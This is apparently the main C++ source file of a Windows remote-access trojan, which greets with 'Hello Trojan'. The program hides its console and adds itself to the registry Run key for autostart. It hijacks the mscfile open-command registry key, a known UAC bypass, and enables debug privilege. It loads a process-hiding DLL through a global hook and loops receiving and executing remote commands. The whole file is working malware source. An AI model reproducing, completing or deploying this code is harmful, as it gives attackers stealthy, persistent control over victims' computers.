#include "Config.h"
#include "Global.h"
#include "Controller.h"

using namespace std;

// #define DEBUG

char recvBuffer[BUFFER_SIZE];
vector<string> fileScanResult;
vector<string> directoryScanResult;

void HKRunator()   // 程序自启动 
{
	HKEY hKey;  //操作注册表的句柄

	   //找到系统的启动项位置 
	LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	//打开启动项Key  
	long lRet = RegOpenKeyEx(HKEY_CURRENT_USER, lpRun, 0, KEY_WRITE, &hKey);

	if (lRet == ERROR_SUCCESS)  //打开成功
	{
		char pFileName[MAX_PATH] = { 0 };  //定义存放路径
		//得到程序自身的全路径  
		DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);
		//添加一个子Key,并设置值 // 下面的"test"是应用程序名字（不加后缀.exe） 
		lRet = RegSetValueEx(hKey, "SetAutoRun", 0, REG_SZ, (BYTE*)pFileName, dwRet);
		//关闭注册表  
		RegCloseKey(hKey);
		if (lRet != ERROR_SUCCESS)
		{
			printf("系统参数错误,不能完成开机启动设置\n");
		}
		else
		{
			printf("打开开机启动成功\n");
		}
		// isrun = 1; 
	}
}

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

bool IsConsoleVisible()
{
	return ::IsWindowVisible(::GetConsoleWindow()) != FALSE;
}

int EnableDebugPriv(const char* name)
{
	HANDLE hToken;        //进程令牌句柄
	TOKEN_PRIVILEGES tp;  //TOKEN_PRIVILEGES结构体，其中包含一个【类型+操作】的权限数组
	LUID luid;           //上述结构体中的类型值

	//打开进程令牌环
	//GetCurrentProcess()获取当前进程的伪句柄，只会指向当前进程或者线程句柄，随时变化
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		fprintf(stderr, "OpenProcessToken error\n");
		return -1;
	}

	//获得本地进程name所代表的权限类型的局部唯一ID
	if (!LookupPrivilegeValue(NULL, name, &luid))
	{
		fprintf(stderr, "LookupPrivilegeValue error\n");
	}

	tp.PrivilegeCount = 1;                               //权限数组中只有一个“元素”
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  //权限操作
	tp.Privileges[0].Luid = luid;                        //权限类型

	//调整进程权限
	if (!AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		fprintf(stderr, "AdjustTokenPrivileges error!\n");
		return -1;
	}

	return 0;
}

BOOL SetReg(char* lpszExePath)

{

	HKEY hKey = NULL;

	// 创建项

	::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\Shell\\Open\\Command", 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &hKey, NULL);

	// 设置键值

	::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 + ::lstrlen(lpszExePath)));

	// 关闭注册表

	::RegCloseKey(hKey);

	return TRUE;

}

int main()
{
#ifndef DEBUG
	if (HIDE_CONSOLE)
	{
		HideConsole();
	}
	cout << "Hello Trojan: " << GetCurrentProcessId() << endl;
	if (AUTOSTART)
	{
		HKRunator();
	}
	char test1[30];
	char test2[30] = { 0 };
	while (1)
	{
		Controller ctrl;
		bool NORMAL = true;

		if (ctrl.initializeError)
		{
			cout << "initialize error: " << GetLastError() << endl;
		}
		else
		{
			while (NORMAL && ctrl.working)
			{
				NORMAL = ctrl.RecvCmd();
				if (NORMAL)
					NORMAL = ctrl.ExecCmd();
			}
			if (NORMAL)
			{
				cout << "[+] Successfully Quit. [+]" << endl;
			}
			else
			{
				cout << "[-] Error: " << GetLastError() << endl;
			}
		}
		ctrl.Close();
	}
#endif
#ifdef DEBUG
	if (EnableDebugPriv(SE_DEBUG_NAME))
		cout << "Get debug privilege FAILED\n";
	// 加载DLL并获取句柄
	HMODULE hDll = ::LoadLibrary("HideProcessDll.dll");
	if (NULL == hDll)
	{
		printf("%s error[%d]\n", "LoadLibrary", ::GetLastError());
	}
	printf("Load Library OK.\n");

	// 设置全局钩子
	typedef HHOOK(*typedef_SetHook)();
	typedef_SetHook SetHook = (typedef_SetHook)::GetProcAddress(hDll, "SetHook");
	if (NULL == SetHook)
	{
		printf("GetProcAddress Error[%d]\n", ::GetLastError());
	}
	HHOOK hHook = SetHook();
	if (NULL == hHook)
	{
		printf("%s error[%d]\n", "SetWindowsHookEx", ::GetLastError());
	}
	printf("Set Windows Hook OK.\n");
	system("pause");
	// 卸载全局钩子
	typedef BOOL(*typedef_UnsetHook)(HHOOK);
	typedef_UnsetHook UnsetHook = (typedef_UnsetHook)::GetProcAddress(hDll, "UnsetHook");
	if (NULL == UnsetHook)
	{
		printf("GetProcAddress Error[%d]\n", ::GetLastError());
	}
	if (FALSE == UnsetHook(hHook))
	{
		printf("%s error[%d]\n", "UnhookWindowsHookE", ::GetLastError());
	}
	printf("Unhook Windows Hook OK.\n");
	// 卸载DLL
	::FreeLibrary(hDll);
#endif

	//ShowConsole();
	system("pause");
}